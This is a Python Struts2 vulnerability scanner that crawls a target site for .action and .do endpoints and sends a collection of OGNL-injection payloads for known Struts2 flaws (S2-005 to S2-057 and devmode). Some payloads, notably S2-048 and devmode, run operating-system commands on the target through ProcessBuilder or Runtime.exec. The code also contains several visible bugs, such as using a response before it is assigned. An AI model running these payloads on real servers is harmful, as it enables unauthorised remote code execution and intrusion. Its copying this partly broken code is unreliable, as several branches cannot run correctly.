# -*- coding:utf-8 -*-


from exp.lib.httpparse import httpparse
import re
import requests
import random
import sys
try:
    from urllib import parse as urlparse
except ImportError:
    import urlparse
try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except Exception:
    pass

class ex_struts():

    def __init__(self, ip, port, protocol):
        self.ip = ip
        self.port = port
        self.protocol = protocol
        self.root_urls = [self.protocol+'://'+self.ip+':'+str(self.port)+'/']

    def http_url(self, method, url, postdata='', header={}):
        http = httpparse()
        if re.search('^http',url,re.I):
            url_all = url
            url_ele = url.split('/')
            if len(url_ele) > 3 and url_ele[-1] != '':
                url_tail = re.search('/'+url_ele[3]+'$|/'+url_ele[3]+'/.*',url,re.I).group()
                #print url_tail
            else:
                url_tail = '/'
            if re.search(':', url_ele[2]):
                if method == 'GET':
                    tm = http.httpreq('GET', url_ele[0].replace(':',''),url_ele[2].split(':')[0], int(url_ele[2].split(':')[1]),  url_tail,header=header)
                else:
                    tm = http.httpreq('POST', url_ele[0].replace(':',''),url_ele[2].split(':')[0], int(url_ele[2].split(':')[1]),  url_tail, data=postdata)
            else:
                if re.search('^https',url,re.I):
                    port = 443
                else:
                    port =80
                if method == 'GET':
                    tm = http.httpreq('GET', url_ele[0].replace(':',''),url_ele[2], port,  url_tail, header=header)
                else:
                    tm = http.httpreq('POST', url_ele[0].replace(':',''),url_ele[2], port,  url_tail, data=postdata)
        else:
            url_all = self.protocol+'://'+self.ip+':'+str(self.port)+'/' + url
            #url_all = self.protocol + '://' + self.ip + ':' + str(self.port) + url
            if method == 'GET':
                tm = http.httpreq('GET', self.protocol,self.ip, self.port,  '/' + url, header=header)
            else:
                tm = http.httpreq('POST',self.protocol,  self.ip, self.port, '/' + url, data=postdata)
        return (url_all, tm)

    #===find action/do('.action'/'.action?'/".action"/".action?/)
    def findaction(self, httpdata):
        httpdata = httpdata.replace('\\\'','\'')
        httpdata = httpdata.replace('\\\"','\"')
        action_urls = re.findall('\'[^\']*\.action\'|\"[^\"]*\.action\"|\'[^\']*\.action\?.*\'|\"[^\"]*\.action\?.*\"|\'[^\']*\.do\'|\"[^\"]*\.do\"|\'[^\']*\.do\?.*\'|\"[^\"]*\.do\?.*\"|\'[^\']*\.do\;.*\'|\"[^\"]*\.do\;.*\"', httpdata, re.I)
        action_urls_n = []
        for m in action_urls:
            m = m.replace('\"', '')
            m = m.replace('\'', '')
            if re.search('.*\.action',m,re.I):
                m = re.search('.*\.action',m,re.I).group()
            else:
                m = re.search('.*\.do',m,re.I).group()
            action_urls_n.append(m)
        return action_urls_n


    #===find js(src='.js'/src=".js")
    def actioninjs(self, httpdata):
        action_url = []
        js_urls = re.findall('src.*\'.*\.js\'|src.*\".*\.js\"', httpdata, re.I)
        for m in js_urls:
            if re.search('\'',m):
                js_url = re.search('\'(.*)\'', m).group(1)
            else:
                js_url = re.search('\"(.*)\"', m).group(1)
            tm = self.http_url('GET', js_url)[1]
            action_url = action_url + self.findaction(str(tm[2]))
        return action_url

    def newself(self, url):
        if re.search('https', url, re.I):
            self.protocol = 'https'
        else:
            self.protocol = 'http'
        if re.search('//', url):
            url_ele = url.split('/')
            if re.search(':', url_ele[2]):
                self.ip = url_ele[2].split(':')[0]
                self.port = int(url_ele[2].split(':')[1])
            else:
                self.ip = url_ele[2]
                if self.protocol == 'https':
                    self.port = 443
                else:
                    self.port = 80
            if len(url_ele) > 3 and url_ele[-1] != '':
                self.root_urls = self.root_urls+[re.search('/'+url_ele[3]+'$|/'+url_ele[3]+'/.*',url,re.I).group()]
                print(self.root_urls)
            else:
                self.root_urls = self.root_urls+['/']
        else:
            url_ele = url.split('/')
            if re.search(':', url_ele[0]):
                self.ip = url_ele[0].split(':')[0]
                self.port = int(url_ele[0].split(':')[1])
            else:
                self.ip = url_ele[0]
                self.port = 80
            if len(url_ele) > 1:
                self.root_urls = self.root_urls+['/'+re.search(url_ele[1]+'.*',url,re.I).group()]
            else:
                self.root_urls = self.root_urls+['/']

    def parse_url(self,action_url):
        url = action_url.replace('#', '%23')
        url = action_url.replace(' ', '%20')
        if re.search('^http', url, re.I) or re.search('^https', url, re.I):
            url = url
        else:
            url = self.protocol + '://' + self.ip + ':' + str(self.port) + '/' + url

        scheme = urlparse.urlparse(url).scheme
        site = scheme + '://' + urlparse.urlparse(url).netloc
        file_path = urlparse.urlparse(url).path
        if (file_path == ''):
            file_path = '/'
        try:
            filename = url.split('/')[-1]
        except IndexError:
            filename = ''
        file_dir = file_path.rstrip(filename)
        if (file_dir == ''):
            file_dir = '/'
        return ({"site": site,
                 "file_dir": file_dir,
                 "filename": filename})

    def build_injection_inputs(self,url):
        parsed_url = self.parse_url(url)
        injection_inputs = []
        url_directories = parsed_url["file_dir"].split("/")
        try:
            url_directories.remove("")
        except ValueError:
            pass

        for i in range(len(url_directories)):
            injection_entry = "/".join(url_directories[:i])
            if not injection_entry.startswith("/"):
                injection_entry = "/%s" % (injection_entry)
            if not injection_entry.endswith("/"):
                injection_entry = "%s/" % (injection_entry)
            injection_entry += "{{INJECTION_POINT}}/"
            injection_entry += parsed_url["filename"]
            injection_inputs.append(injection_entry)
        return (injection_inputs)


    def struts2(self, action_url):
        payloads = {"S2-005":"('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('\\43xman.getWriter().println(1111*2222)')(d))&(i99)(('\\43xman.getWriter().close()')(d))",
                   "S2-009A":"class.classLoader.jarPath=(#context['xwork.MethodAccessor.denyMethodExecution']= new java.lang.Boolean(false), #_memberAccess['allowStaticMethodAccess']=true,#req=@org.apache.struts2.ServletActionContext@getRequest(),#outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#outstr.println(1111*2222),#outstr.close())(meh)&z[(class.classLoader.jarPath)('meh')]",
                   "S2-009B":"class['classLoader'].jarPath=(#context['xwork.MethodAccessor.denyMethodExecution']= new java.lang.Boolean(false), #_memberAccess['allowStaticMethodAccess']=true,#req=@org.apache.struts2.ServletActionContext@getRequest(),#outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#outstr.println(1111*2222),#outstr.close())(meh)&z[(class['classLoader'].jarPath)('meh')]",
                   "S2-013":"a=1${(%23_memberAccess['allowStaticMethodAccess']=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23k8out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23k8out.println(1111*2222),%23k8out.close())}",
                   "S2-057":"",
                   "S2-016A":"redirect:${1111*2222}",
                   "S2-016B":"redirectAction:${1111*2222}",
                   "S2-016C":"action:${1111*2222}",
                   "S2-019A":"debug=command&expression=1111*2222",
                   "S2-019B":"debug=command&expression=%23_memberAccess['allowStaticMethodAccess']=true,@java.lang.Runtime@getRuntime()",
                   "S2-020":"Class.ClassLoader.parent=GENXOR",
                   "S2-021":"Class['ClassLoader'].resources=GENXOR",
                   "S2-022A":"Class.ClassLoader.parent=GENXOR",
                   "S2-022B":"Class['ClassLoader'].resources=GENXOR",
                   "S2-032": "method:%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%2C%23test%3D%23context.get%28%23parameters.res%5B0%5D%29.getWriter%28%29%2C%23test.println%28%23parameters.command%5B0%5D%29%2C%23test.flush%28%29%2C%23test.close&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=%23%23%232468642%23%23%23",
                   "S2-045": "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println('['+'kgdnshrtkkbys'+']')).(#o.close())}",
                   "S2-048":"",
                   "S2-devmode":"/S2-devMode/orders/3/?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=123456789&command=netstat -ano"
                   }
        success = []
        payload = {}
        for id in payloads:
            if re.search('^http',action_url,re.I) or re.search('^https',action_url,re.I):
                url_all = action_url
            else:
                url_all = self.protocol + '://' + self.ip + ':' + str(self.port) +'/' + action_url
                #url_all = self.protocol+'://'+self.ip+':'+str(self.port)+'/' + action_url
            if id == "S2-045":
                header = {
                    'Content-Type': payloads[id]
                }
                res_html = requests.get(url_all,headers = header,verify=False,timeout=4).text
                if 'kgdnshrtkkbys' in res_html:
                    success.append("".join(filter(str.isdigit,id)))
                    payload[id] = url_all
            elif id == "S2-057":
                try:
                    retval = False
                    headers = dict()
                    headers[
                        'User-Agent'] = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:61.0) Gecko/20100101 Firefox/61.0'
                    r1 = random.randint(10000, 99999)
                    r2 = random.randint(10000, 99999)
                    r3 = r1 + r2
                    urlOne = url_all
                    res = requests.get(url=urlOne, timeout=4, allow_redirects=False, verify=False)
                    if res.status_code == 200:
                        urlTemp = urlparse.urlparse(urlOne)
                        urlTwo = urlTemp.scheme + '://' + urlTemp.netloc + '/${%s+%s}/index.action' % (r1, r2)
                        res = requests.get(url=urlTwo, timeout=6, allow_redirects=False, verify=False)
                        if res.status_code == 302 and res.headers.get('Location') is not None and str(r3) in res.headers.get('Location'):
                            urlThree = res.headers.get('Location')
                            res = requests.get(url=urlThree, timeout=6, allow_redirects=False, verify=False)
                            retval |= str(r3) in res.text
                except:
                    pass
                finally:
                    if retval:
                        success.append("".join(filter(str.isdigit, id)))
                        payload[id] = urlThree
            elif id == "S2-057777":
                random_value = int(''.join(random.choice('0123456789') for i in range(2)))
                multiplication_value = random_value * random_value
                injection_points = self.build_injection_inputs(action_url)
                parsed_url = self.parse_url(action_url)
                attempts_counter = 0
                headers = {
                    'User-Agent': 'struts-pwn (https://github.com/mazen160/struts-pwn_CVE-2018-11776)',
                    # 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
                    'Accept': '*/*'
                }
                for injection_point in injection_points:
                    attempts_counter += 1
                    testing_url = "%s%s" % (parsed_url["site"], injection_point)
                    testing_url = testing_url.replace("{{INJECTION_POINT}}",
                                                      "${{%s*%s}}" % (random_value, random_value))
                    try:
                        print(resp.text)
                        resp = requests.get(testing_url, headers=headers, verify=False, timeout=3,
                                            allow_redirects=False)
                    except Exception as e:
                        continue
                    if "Location" in resp.headers.keys():
                        if str(multiplication_value) in resp.headers['Location']:
                            success.append("".join(filter(str.isdigit, id)))
                            payload[id] = url_all
            elif id == "S2-048":
                data = {'name':"${(#dm=@\u006Fgnl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#ef='echo s2-048-EXISTS').(#iswin=(@\u006Aava.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#efe=(#iswin?{'cmd.exe','/c',#ef}:{'/bin/bash','-c',#ef})).(#p=new \u006Aava.lang.ProcessBuilder(#efe)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}", 'age':'bbb', '__checkbox_bustedBefore':'true', 'description':'ccc'}
                newurl = self.protocol + '://' + self.ip + ':' + str(self.port) +'/struts2-showcase/integration/saveGangster.action'
                res = requests.post(newurl, data=data,timeout=5).text
                if 's2-048-EXISTS' in res:
                    success.append("".join(filter(str.isdigit,id)))
                    payload[id] = url_all
            elif id == "S2-devmode":
                dvmode_url = self.protocol+'://'+self.ip+':'+str(self.port)+payloads[id]
                try:
                    header ={"Content-Type", "application/x-www-form-urlencoded"}
                    res_html = requests.post(dvmode_url, data=data,timeout=5,headers=header).text
                    if "0.0.0.0" in res_html:
                        success.append("".join(filter(str.isdigit,id)))
                        payload[id] = dvmode_url
                except Exception as e:
                    continue
            elif not re.search("".join(filter(str.isdigit,id)),str(success)):
                tm = self.http_url('POST', action_url, postdata=payloads[id])
                if re.search('S2-016', id):
                    if re.search('2468642', str(tm[1][1])):
                        success.append("".join(filter(str.isdigit,id)))
                        payload[id] = tm[0]
                elif id == "S2-020" or id == "S2-021":
                    if tm[1][0] == 404 and self.http_url('POST', action_url, postdata='')[1][0] != 404:
                        success.append("".join(filter(str.isdigit,id)))
                        payload[id] = tm[0]
                elif re.search('S2-022', id):
                    if self.http_url('GET', action_url, header={"Cookie":payloads[id]})[1][0] == 404 and self.http_url('GET', action_url)[1][0] != 404:
                        success.append("".join(filter(str.isdigit,id)))
                        payload[id] = tm[0]
                else:
                    if re.search('2468642|java\.lang\.Runtime@', str(tm[1][1]), re.I) and not re.search('com.opensymphony.xwork2.dispatcher.HttpServletResponse&command|@java.lang.Runtime@getRuntime', tm[1][2], re.I):
                        success.append("".join(filter(str.isdigit,id)))
                        payload[id] = tm[0]
        return payload

    def run(self):
        action_url = []
        result = {}
        http2 = httpparse()
        #===Confirm root(location = ''/location = "")
        try:
            tm = http2.httpreq('GET', self.protocol,self.ip, self.port,'/')
            if tm[0] == 301 or tm[0] == 302:
                tm = http2.httpreq('GET', self.protocol, self.ip, self.port, '/', header='location')[1]
                self.newself(tm)
            else:
                new_tm = re.sub(b'//.*location', b'//aa', tm[2])
                if re.search('location.*=\s*\'.*\'|location.*=\s*\".*\"',str(new_tm),re.I):
                    locat_url_g=re.search('location.*=\s*\'(.*)\'|location.*=\s*\"(.*)\"',str(new_tm),re.I)
                    if locat_url_g.group(1) is None:
                        locat_url = locat_url_g.group(2)
                    else:
                        locat_url = locat_url_g.group(1)
                    if re.search('http',locat_url,re.I):
                        self.newself(locat_url)
                    else:
                        self.root_urls.append(locat_url)

            #print self.protocol, self.ip, self.port, self.root_urls

        #===fetch self.root_urls for js and action/do
            for root_url in self.root_urls:
                if re.search('\.action|\.do', root_url, re.I):
                    action_url.append(re.search('.*\.action|.*\.do', root_url, re.I).group())
                tm = self.http_url('GET', root_url)[1]
                action_url = action_url + self.findaction(str(tm[2])) + self.actioninjs(str(tm[2]))

            print(self.ip, self.port, self.protocol, self.root_urls)
        #===guess index.action/login.action
            if len(self.root_urls) == 1:
                for m in ['index.action', 'index.do', 'login.action', 'login.do', 'test.action', 'test.do', 'default.action', 'default.do']:
                    if not re.search(m, str(action_url), re.I):
                        rp_code = http2.httpreq('GET', self.protocol,self.ip, self.port,  '/'+m)[0]
                        if  rp_code not in [401, 403, 404, 501, 502, 503, 504] and rp_code > 1:
                            action_url.append(m)
            else:
                root_urls_ele = self.root_urls[1].split('/')
                if re.search('\.', root_urls_ele[-1]):
                    root_path = self.root_urls[1].rstrip(root_urls_ele[-1])
                else:
                    root_path = self.root_urls[1]
                if not re.search('/$', root_path):
                    root_path = root_path + '/'
                for m in ['index.action', 'index.do', 'login.action', 'login.do', 'test.action', 'test.do', 'default.action', 'default.do']:
                    if not re.search(m, str(action_url), re.I):
                        rp_code = http2.httpreq('GET', self.protocol, self.ip, self.port, '/'+m)[0]
                        if rp_code not in [401, 403, 404, 501, 502, 503, 504] and rp_code > 1:
                            action_url.append(m)
                        rp_code = self.http_url('GET',root_path+m)[1][0]
                        if rp_code not in [401, 403, 404, 501, 502, 503, 504] and rp_code > 1:
                            action_url.append(root_path+m)
            print('>>>>>>>>>>>action_url:', action_url)
        #===Check St2
            for url in action_url:
                if not re.search('=', url):
                    rp_code = self.http_url('GET', url)[1][0]
                    if rp_code not in [401, 403, 404, 501, 502, 503, 504] and rp_code > 1:
                        result = self.struts2(url)
                        if len(result) > 0:
                            break


        except Exception as e:
            print(str(e))

        return result

